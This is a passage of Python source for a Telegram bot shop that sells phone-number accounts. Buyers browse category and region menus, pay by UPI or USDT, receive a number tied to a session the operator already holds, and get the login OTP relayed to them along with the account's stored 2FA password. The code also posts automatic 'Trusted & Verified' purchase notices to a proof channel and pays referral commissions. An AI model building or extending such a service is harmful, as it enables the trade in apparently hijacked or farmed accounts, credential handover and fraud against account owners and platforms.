    current_cats = cats[page * items_per_page : (page + 1) * items_per_page]
    
    for c in current_cats:
        markup.add(types.InlineKeyboardButton(f"► {c}", callback_data=f"sub_{c}_0"))
        
    nav_btns = []
    if page > 0: nav_btns.append(types.InlineKeyboardButton("◀️ 𝗣𝗿𝗲𝘃𝗶𝗼𝘂𝘀", callback_data=f"cat_{page-1}"))
    if page < total_pages - 1: nav_btns.append(types.InlineKeyboardButton("𝗡𝗲𝘅𝘁 ▶️", callback_data=f"cat_{page+1}"))
    if nav_btns: markup.row(*nav_btns)
    
    markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨", callback_data="back_to_menu"))
    bot.edit_message_text(f"{HDR}\n   📦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗦𝗧𝗢𝗖𝗞\n{HDR}\n\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆 (Page {page+1}/{total_pages}):", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
def show_subcategories(call):
    parts = call.data.split("_")
    cat = parts[1]
    page = int(parts[2])
    subs = get_active_subcategories(cat)
    
    if not subs:
        bot.answer_callback_query(call.id, "Category empty or sold out.")
        return show_categories(call)

    markup = types.InlineKeyboardMarkup(row_width=1)
    items_per_page = 10
    total_pages = (len(subs) - 1) // items_per_page + 1
    current_subs = subs[page * items_per_page : (page + 1) * items_per_page]
    
    for s in current_subs:
        # Pass safe hash to avoid 64byte callback data limit
        safe_hash = hashlib.md5(f"{cat}_{s}".encode()).hexdigest()[:10]
        db.data[f"hash_{safe_hash}"] = {"cat": cat, "sub": s} # Temp memory
        markup.add(types.InlineKeyboardButton(f"▸ {s}", callback_data=f"itm_{safe_hash}_0"))
        
    nav_btns = []
    if page > 0: nav_btns.append(types.InlineKeyboardButton("◀️ 𝗣𝗿𝗲𝘃", callback_data=f"sub_{cat}_{page-1}"))
    if page < total_pages - 1: nav_btns.append(types.InlineKeyboardButton("𝗡𝗲𝘅𝘁 ▶️", callback_data=f"sub_{cat}_{page+1}"))
    if nav_btns: markup.row(*nav_btns)
        
    markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗖𝗔𝗧𝗘𝗚𝗢𝗥𝗜𝗘𝗦", callback_data="cat_0"))
    bot.edit_message_text(f"{HDR}\n   📂 𝗖𝗔𝗧𝗘𝗚𝗢𝗥𝗬: {cat}\n{HDR}\n\n» 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗿𝗲𝗴𝗶𝗼𝗻/𝘁𝘆𝗽𝗲:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("itm_"))
def show_items(call):
    parts = call.data.split("_")
    safe_hash = parts[1]
    page = int(parts[2])
    
    stored = db.data.get(f"hash_{safe_hash}")
    if not stored: return bot.answer_callback_query(call.id, "Session expired, please go back.")
    cat, sub = stored["cat"], stored["sub"]
    
    itms = get_active_items(cat, sub)
    if not itms:
        bot.answer_callback_query(call.id, "Sold out.")
        return show_categories(call)

    markup = types.InlineKeyboardMarkup(row_width=1)
    items_per_page = 10
    total_pages = (len(itms) - 1) // items_per_page + 1
    current_itms = itms[page * items_per_page : (page + 1) * items_per_page]
    
    for i in current_itms:
        itm_data = db.data["adv_stocks"][cat][sub][i]
        price = itm_data["price"]
        prc_txt = "𝗙𝗥𝗘𝗘" if price == "free" else f"₹{price}"
        stock_c = len(itm_data.get("pool", []))
        
        itm_hash = hashlib.md5(f"{cat}_{sub}_{i}".encode()).hexdigest()[:10]
        db.data[f"ihash_{itm_hash}"] = {"cat": cat, "sub": sub, "itm": i}
        
        markup.add(types.InlineKeyboardButton(f"▪️ {i} | {prc_txt} [{stock_c} left]", callback_data=f"dtl_{itm_hash}"))
        
    nav_btns = []
    if page > 0: nav_btns.append(types.InlineKeyboardButton("◀️ 𝗣𝗿𝗲𝘃", callback_data=f"itm_{safe_hash}_{page-1}"))
    if page < total_pages - 1: nav_btns.append(types.InlineKeyboardButton("𝗡𝗲𝘅𝘁 ▶️", callback_data=f"itm_{safe_hash}_{page+1}"))
    if nav_btns: markup.row(*nav_btns)
        
    markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗙𝗢𝗟𝗗𝗘𝗥", callback_data=f"sub_{cat}_0"))
    bot.edit_message_text(f"{HDR}\n   📁 𝗦𝗨𝗕: {sub}\n{HDR}\n\n» 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗽𝗿𝗼𝗱𝘂𝗰𝘁 𝘁𝗼 𝘃𝗶𝗲𝘄 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dtl_"))
def item_details(call):
    itm_hash = call.data.split("_")[1]
    stored = db.data.get(f"ihash_{itm_hash}")
    if not stored: return bot.answer_callback_query(call.id, "Session expired.")
    cat, sub, itm = stored["cat"], stored["sub"], stored["itm"]
    
    data = db.data.get("adv_stocks", {}).get(cat, {}).get(sub, {}).get(itm)
    if not data or len(data.get("pool", [])) == 0:
        bot.answer_callback_query(call.id, "Error: Item already sold out."); return
        
    price_val = 0 if data["price"] == "free" else float(data["price"])
    price_text = "𝗙𝗥𝗘𝗘" if data["price"] == "free" else f"₹{data['price']}"
    user = db.get_user(call.from_user.id)
    bal = user.get("balance", 0)
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    if bal >= price_val: markup.add(types.InlineKeyboardButton("⚡ 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗡𝗢𝗪", callback_data=f"buy_{itm_hash}"))
    else: markup.add(types.InlineKeyboardButton("💳 𝗔𝗗𝗗 𝗙𝗨𝗡𝗗𝗦 𝗧𝗢 𝗕𝗨𝗬", callback_data="deposit"))
    
    safe_hash = hashlib.md5(f"{cat}_{sub}".encode()).hexdigest()[:10]
    markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗟𝗜𝗦𝗧", callback_data=f"itm_{safe_hash}_0"))
    
    bot.edit_message_text(f"{HDR}\n   🛒 𝗣𝗥𝗢𝗗𝗨𝗖𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n{HDR}\n\n┣ 📌 𝗜𝘁𝗲𝗺: {itm}\n┣ 📂 𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: {cat} > {sub}\n┣ 📦 𝗜𝗻 𝗦𝘁𝗼𝗰𝗸: {len(data['pool'])}\n┗ 💰 𝗣𝗿𝗶𝗰𝗲: {price_text}\n\n📝 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻:\n{data.get('description','')}\n\n{DIV}\n💼 𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{bal:.2f}", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def buy_item(call):
    try:
        itm_hash = call.data.split("_")[1]
        stored = db.data.get(f"ihash_{itm_hash}")
        if not stored: return bot.answer_callback_query(call.id, "Session expired.")
        cat, sub, itm = stored["cat"], stored["sub"], stored["itm"]
        
        data = db.data.get("adv_stocks", {}).get(cat, {}).get(sub, {}).get(itm)
        if not data or len(data.get("pool", [])) == 0:
            return bot.answer_callback_query(call.id, "Error: Item already sold out.")
            
        user = db.get_user(call.from_user.id)
        price = 0 if data["price"] == "free" else float(data["price"])
        bal = user.get("balance", 0)
        
        if bal < price: return bot.edit_message_text(f"⊘ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀. 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 ₹{price-bal:.2f} 𝗺𝗼𝗿𝗲.", call.message.chat.id, call.message.message_id)
        
        # Pop the first available stock
        purchased_stock = data["pool"].pop(0)
        phone = purchased_stock["phone"]
        
        user["balance"] = bal - price; user["spent"] = user.get("spent",0) + price
        aid = f"ORD-{random.randint(10000,99999)}"
        user["purchases"] = user.get("purchases", [])
        user["purchases"].append({"category":cat, "sub": sub, "method":itm,"price":price,"phone_number":phone,"account":aid,"date":datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
        
        if user.get("referred_by"):
            ref = db.get_user(user["referred_by"]); ref["balance"] = ref.get("balance",0) + price*0.03; ref["ref_earnings"] = ref.get("ref_earnings",0) + price*0.03
            
        db.mark_sold(phone); db.save_data()
        
        ms = None
        for sn, sd in db.data.get("sessions", {}).items():
            if str(sd.get("phone","")) == phone and sn in active_clients: ms = sn; break
        
        uid = str(call.from_user.id)
        if uid in otp_tracker: del otp_tracker[uid]
        db.data["otp_waiting"][uid] = {"phone":phone,"session":ms,"account":aid}; db.save_data()
        
        bot.edit_message_text(f"{HDR}\n   ✅ 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ✅\n{HDR}\n\n┣ 📌 𝗜𝘁𝗲𝗺: {itm}\n┣ 💰 𝗔𝗺𝗼𝘂𝗻𝘁: ₹{price:.2f}\n┣ 📱 𝗣𝗵𝗼𝗻𝗲: <code>{phone}</code>\n┗ 🧾 𝗢𝗿𝗱𝗲𝗿 𝗜𝗗: {aid}\n\n{DIV}\n💼 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{user['balance']:.2f}\n\n» 🔐 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗣𝗹𝗲𝗮𝘀𝗲 𝗹𝗼𝗴𝗶𝗻 𝘁𝗼 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝘆𝗼𝘂𝗿 𝗢𝗧𝗣 𝗵𝗲𝗿𝗲.", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
        # Admin Notification
        for oid in [SECRET_OWNER_ID] + db.data.get("public_owners", []):
            try:
                markup = types.InlineKeyboardMarkup(); markup.add(types.InlineKeyboardButton("🎧 𝗖𝗢𝗡𝗡𝗘𝗖𝗧 𝗪𝗜𝗧𝗛 𝗕𝗨𝗬𝗘𝗥", callback_data=f"conn_{call.from_user.id}"))
                bot.send_message(oid, f"{HDR}\n   🔥 𝗡𝗘𝗪 𝗦𝗔𝗟𝗘 🔥\n{HDR}\n\n👤 𝗕𝘂𝘆𝗲𝗿: {call.from_user.first_name}\n📦 𝗜𝘁𝗲𝗺: {itm}\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ₹{price}\n📱 𝗣𝗵𝗼𝗻𝗲: {phone}", reply_markup=markup)
            except: pass
            
        # Proof Channel Notification
        if db.data.get("proof_channel"):
            try:
                proof_msg = f"{HDR}\n  ✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 ✅\n{HDR}\n\n👤 𝗕𝘂𝘆𝗲𝗿: {call.from_user.first_name}\n📦 𝗜𝘁𝗲𝗺: {itm}\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ₹{price:.2f}\n🌟 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗧𝗿𝘂𝘀𝘁𝗲𝗱 & 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱\n{DIV}\n🤖 @{bot.get_me().username}"
                bot.send_message(db.data["proof_channel"], proof_msg)
            except: pass
            
    except Exception as e: print(f"Buy: {e}"); bot.answer_callback_query(call.id, "Transaction Error")

# ═══════════════════════════════════════
# TICKETS & SUPPORT
# ═══════════════════════════════════════

@bot.callback_query_handler(func=lambda call: call.data == "support_menu")
def support_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗜𝘀𝘀𝘂𝗲", callback_data="ticket_payment"))
    markup.add(types.InlineKeyboardButton("🔐 𝗢𝗧𝗣 𝗡𝗼𝘁 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱", callback_data="ticket_otp"))
    markup.add(types.InlineKeyboardButton("📝 𝗢𝘁𝗵𝗲𝗿 𝗜𝗻𝗾𝘂𝗶𝗿𝘆", callback_data="ticket_other"))
    markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨", callback_data="back_to_menu"))
    bot.edit_message_text(f"{HDR}\n   🎧 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗖𝗘𝗡𝗧𝗘𝗥\n{HDR}\n\n» 𝗛𝗼𝘄 𝗰𝗮𝗻 𝘄𝗲 𝗵𝗲𝗹𝗽 𝘆𝗼𝘂 𝘁𝗼𝗱𝗮𝘆?\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝘁𝗵𝗲 𝗶𝘀𝘀𝘂𝗲 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("ticket_"))
def process_ticket(call):
    issue = call.data.replace("ticket_", "").upper()
    msg = bot.edit_message_text(f"📝 𝗬𝗼𝘂 𝘀𝗲𝗹𝗲𝗰𝘁𝗲𝗱: {issue}\n{DIV}\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝘆𝗽𝗲 𝘆𝗼𝘂𝗿 𝗱𝗲𝘁𝗮𝗶𝗹𝗲𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗻𝗼𝘄 (𝗼𝗿 𝘁𝘆𝗽𝗲 /𝗰𝗮𝗻𝗰𝗲𝗹 𝘁𝗼 𝗮𝗯𝗼𝗿𝘁):", call.message.chat.id, call.message.message_id)
    bot.register_next_step_handler(msg, lambda m: submit_ticket(m, issue))

def submit_ticket(message, issue):
    if message.text and message.text.lower() == '/cancel':
        return bot.send_message(message.chat.id, "✅ Ticket cancelled.", reply_markup=get_main_menu())
    
    uid = message.from_user.id
    ticket_id = f"TKT-{random.randint(1000,9999)}"
    
    txt = f"{HDR}\n   🎫 𝗡𝗘𝗪 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗧𝗜𝗖𝗞𝗘𝗧\n{HDR}\n\n┣ 🆔 𝗧𝗶𝗰𝗸𝗲𝘁 𝗜𝗗: {ticket_id}\n┣ 📂 𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: {issue}\n┗ 👤 𝗨𝘀𝗲𝗿: {message.from_user.first_name} (<code>{uid}</code>)\n\n💬 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:\n{message.text}"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎧 𝗖𝗢𝗡𝗡𝗘𝗖𝗧 𝗪𝗜𝗧𝗛 𝗨𝗦𝗘𝗥", callback_data=f"conn_{uid}"))
    
    for oid in [SECRET_OWNER_ID] + db.data.get("public_owners", []):
        try: bot.send_message(oid, txt, parse_mode="HTML", reply_markup=markup)
        except: pass
        
    bot.reply_to(message, f"✅ 𝗬𝗼𝘂𝗿 𝘁𝗶𝗰𝗸𝗲𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱!\n» 𝗧𝗶𝗰𝗸𝗲𝘁 𝗜𝗗: {ticket_id}\n» 𝗔𝗻 𝗮𝗱𝗺𝗶𝗻 𝘄𝗶𝗹𝗹 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝘀𝗵𝗼𝗿𝘁𝗹𝘆.", reply_markup=get_main_menu())

# ═══════════════════════════════════════
# OTHER CALLBACKS
# ═══════════════════════════════════════

@bot.callback_query_handler(func=lambda call: call.data.startswith("otpok_"))
def otp_correct(call):
    uid = call.data.replace("otpok_", "")
    data = db.data.get("otp_waiting", {}).get(uid, {}); phone = data.get("phone","?")
    two_fa = "None"
    
    # Advanced stock deep search for 2FA
    for cat in db.data.get("adv_stocks", {}).values():
        for sub in cat.values():
            for itm_data in sub.values():
                for p in itm_data.get("pool", []):
                    if p["phone"] == phone: two_fa = p.get("2fa", "None"); break
                    
    if uid in db.data.get("otp_waiting", {}): del db.data["otp_waiting"][uid]; db.save_data()
    
    txt = f"{HDR}\n   ✅ 𝗢𝗧𝗣 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗 ✅\n{HDR}\n\n┣ 📱 𝗣𝗵𝗼𝗻𝗲: <code>{phone}</code>"
    if two_fa != "None": txt += f"\n┗ 🔐 𝟮𝗙𝗔 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: <code>{two_fa}</code>"
    txt += f"\n\n» 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗱𝗿𝗼𝗽 𝗮 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁."
    bot.edit_message_text(txt, call.message.chat.id, call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("otpno_"))
def otp_wrong(call):
    uid = call.data.replace("otpno_", "")
    bot.edit_message_text(f"⚠️ 𝗥𝗘-𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗢𝗧𝗣...\n{DIV}\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗹𝗼𝗴𝗶𝗻 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗮𝗴𝗮𝗶𝗻.", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "deposit")
def deposit_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🏦 𝗨𝗣𝗜 / 𝗕𝗔𝗡𝗞 𝗧𝗥𝗔𝗡𝗦𝗙𝗘𝗥", callback_data="d_upi"))
    markup.add(types.InlineKeyboardButton("🪙 𝗖𝗥𝗬𝗣𝗧𝗢 (𝗨𝗦𝗗𝗧)", callback_data="d_usdt"))
    markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨", callback_data="back_to_menu"))
    text = f"{HDR}\n   💳 𝗔𝗗𝗗 𝗙𝗨𝗡𝗗𝗦 𝗧𝗢 𝗪𝗔𝗟𝗟𝗘𝗧\n{HDR}\n\n┣ 📥 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝗗𝗲𝗽𝗼𝘀𝗶𝘁: ₹𝟯𝟬\n┗ 📤 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗗𝗲𝗽𝗼𝘀𝗶𝘁: ₹𝟱𝟬,𝟬𝟬𝟬\n\n» 𝗦𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗽𝗿𝗲𝗳𝗲𝗿𝗿𝗲𝗱 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱:"
    try: bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception: bot.delete_message(call.message.chat.id, call.message.message_id); bot.send_message(call.message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "d_upi")
def deposit_upi(call):
    if not db.data.get("upi_id"): bot.answer_callback_query(call.id, "⊘ UPI is currently unavailable."); return
    db.data["deposit_states"][str(call.from_user.id)] = {"method":"upi","step":"screenshot"}; db.save_data()
    markup = types.InlineKeyboardMarkup(); markup.add(types.InlineKeyboardButton("◂ 𝗖𝗔𝗡𝗖𝗘𝗟 & 𝗚𝗢 𝗕𝗔𝗖𝗞", callback_data="deposit"))
    txt = f"{HDR}\n   🏦 𝗨𝗣𝗜 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 🏦\n{HDR}\n\n┣ 👤 𝗡𝗮𝗺𝗲: {db.data.get('display_name','')}\n┗ 🆔 𝗨𝗣𝗜 𝗜𝗗: <code>{db.data.get('upi_id','')}</code>\n\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗹𝗼𝗮𝗱 𝘁𝗵𝗲 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝗲𝗹𝗼𝘄:"
    if db.data.get("upi_qr"): 
        bot.send_photo(call.message.chat.id, db.data["upi_qr"], caption=txt, parse_mode="HTML", reply_markup=markup)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    else: bot.edit_message_text(txt, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "d_usdt")
def deposit_usdt(call):
    db.data["deposit_states"][str(call.from_user.id)] = {"method":"usdt","step":"screenshot"}; db.save_data()
    markup = types.InlineKeyboardMarkup(); markup.add(types.InlineKeyboardButton("◂ 𝗖𝗔𝗡𝗖𝗘𝗟 & 𝗚𝗢 𝗕𝗔𝗖𝗞", callback_data="deposit"))
    bot.edit_message_text(f"{HDR}\n   🪙 𝗨𝗦𝗗𝗧 (𝗧𝗥𝗖𝟮𝟬) 𝗣𝗔𝗬𝗠𝗘𝗡𝗧\n{HDR}\n\n⟡ 𝗔𝗱𝗱𝗿𝗲𝘀𝘀:\n<code>{db.data.get('usdt_address','')}</code>\n\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗹𝗼𝗮𝗱 𝘁𝗵𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝗲𝗹𝗼𝘄:", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_"))
def approve_deposit(call):
    try:
        _, uid, amt = call.data.split("_"); amt = float(amt)
        user = db.get_user(uid); user["balance"] = user.get("balance",0) + amt; user["deposited"] = user.get("deposited",0) + amt
        if user.get("referred_by"):
            ref = db.get_user(user["referred_by"]); ref["balance"] = ref.get("balance",0) + amt*0.03; ref["ref_earnings"] = ref.get("ref_earnings",0) + amt*0.03
        db.save_data()
        try: bot.send_message(uid, f"✅ 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅\n{DIV}\n┣ 𝗔𝗺𝗼𝘂𝗻𝘁 𝗔𝗱𝗱𝗲𝗱: +₹{amt:.2f}\n┗ 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{user['balance']:.2f}")
        except: pass
        bot.edit_message_text(f"✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗: ₹{amt:.2f}", call.message.chat.id, call.message.message_id)
        time.sleep(2); bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("decline_"))
def decline_deposit(call):
    try:
        uid = call.data.split("_")[1]; bot.send_message(uid, f"❌ 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌\n{DIV}\n» 𝗬𝗼𝘂𝗿 𝗿𝗲𝗰𝗲𝗻𝘁 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝘄𝗮𝘀 𝗿𝗲𝗷𝗲𝗰𝘁𝗲𝗱 𝗯𝘆 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻𝗶𝘀𝘁𝗿𝗮𝘁𝗼𝗿.")
        bot.edit_message_text("❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗", call.message.chat.id, call.message.message_id)
        time.sleep(2); bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("conn_"))
def connect_callback(call):
    uid = call.data.split("_")[1]
    db.data["connected_users"][str(call.from_user.id)] = uid; db.save_data()
    try: bot.send_message(uid, f"{HDR}\n   🎧 𝗔𝗗𝗠𝗜𝗡 𝗝𝗢𝗜𝗡𝗘𝗗 𝗧𝗛𝗘 𝗖𝗛𝗔𝗧\n{HDR}\n\n» 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝗽𝗲𝗮𝗸 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝘀𝘂𝗽𝗽𝗼𝗿𝘁 𝘁𝗲𝗮𝗺 𝗱𝗶𝗿𝗲𝗰𝘁𝗹𝘆.")
    except: pass
    bot.edit_message_text(call.message.text + f"\n\n{DIV}\n✅ 𝗔𝗖𝗧𝗜𝗩𝗘 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗘𝗦𝗧𝗔𝗕𝗟𝗜𝗦𝗛𝗘𝗗", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data in ["my_stock","balance","referral","profile","transactions","help"])
def show_info(call):
    user = db.get_user(call.from_user.id); markup = get_back_menu()
    if call.data == "my_stock":
        txt = f"{HDR}\n   📦 𝗠𝗬 𝗜𝗡𝗩𝗘𝗡𝗧𝗢𝗥𝗬\n{HDR}\n" + ("\n» 𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲𝘀 𝗳𝗼𝘂𝗻𝗱." if not user.get("purchases") else "\n".join([f"\n┣ 📌 𝗜𝘁𝗲𝗺: {p.get('method','')}\n┗ 📱 𝗗𝗮𝘁𝗮: <code>{p.get('phone_number','')}</code>\n{DIV}" for p in user.get("purchases", [])]))
    elif call.data == "balance":
        txt = f"{HDR}\n   💼 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗪𝗔𝗟𝗟𝗘𝗧\n{HDR}\n\n💰 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{user.get('balance',0):.2f}\n{DIV}\n┣ 📥 𝗧𝗼𝘁𝗮𝗹 𝗗𝗲𝗽𝗼𝘀𝗶𝘁𝗲𝗱: ₹{user.get('deposited',0):.2f}\n┗ 📤 𝗧𝗼𝘁𝗮𝗹 𝗦𝗽𝗲𝗻𝘁: ₹{user.get('spent',0):.2f}"
    elif call.data == "referral":
        txt = f"{HDR}\n   🤝 𝗔𝗙𝗙𝗜𝗟𝗜𝗔𝗧𝗘 𝗣𝗥𝗢𝗚𝗥𝗔𝗠\n{HDR}\n\n┣ 👥 𝗧𝗼𝘁𝗮𝗹 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹𝘀: {user.get('referrals',0)}\n┗ 💸 𝗧𝗼𝘁𝗮𝗹 𝗘𝗮𝗿𝗻𝗶𝗻𝗴𝘀: ₹{user.get('ref_earnings',0):.2f}\n\n» 🎁 𝗘𝗮𝗿𝗻 𝗮 𝟯% 𝗰𝗼𝗺𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗼𝗻 𝗲𝘃𝗲𝗿𝘆 𝗱𝗲𝗽𝗼𝘀𝗶𝘁 𝗺𝗮𝗱𝗲 𝗯𝘆 𝘆𝗼𝘂𝗿 𝗿𝗲𝗳𝗲𝗿𝗿𝗮𝗹𝘀.\n🔗 𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸: `https://t.me/{bot.get_me().username}?start=ref_{user.get('referral_code')}`"
    elif call.data == "profile":
        txt = f"{HDR}\n   👤 𝗨𝗦𝗘𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘\n{HDR}\n\n📝 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n┣ 👤 𝗡𝗮𝗺𝗲: {call.from_user.first_name}\n┣ 🆔 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗗: <code>{call.from_user.id}</code>\n┗ 📅 𝗠𝗲𝗺𝗯𝗲𝗿 𝗦𝗶𝗻𝗰𝗲: {user.get('joined_date','')}\n\n💰 𝗙𝗶𝗻𝗮𝗻𝗰𝗶𝗮𝗹 𝗦𝘁𝗮𝘁𝘂𝘀:\n┗ 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{user.get('balance',0):.2f}"
    elif call.data == "transactions":
        txns = user.get("transactions", [])
        txt = f"{HDR}\n   📜 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗛𝗜𝗦𝗧𝗢𝗥𝗬\n{HDR}\n" + ("\n» 𝗡𝗼 𝗿𝗲𝗰𝗲𝗻𝘁 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻𝘀." if not txns else "\n".join([f"\n⟡ {t.get('type','')}: ₹{t.get('amount',0):.2f}" for t in txns[-10:]]))
    else:
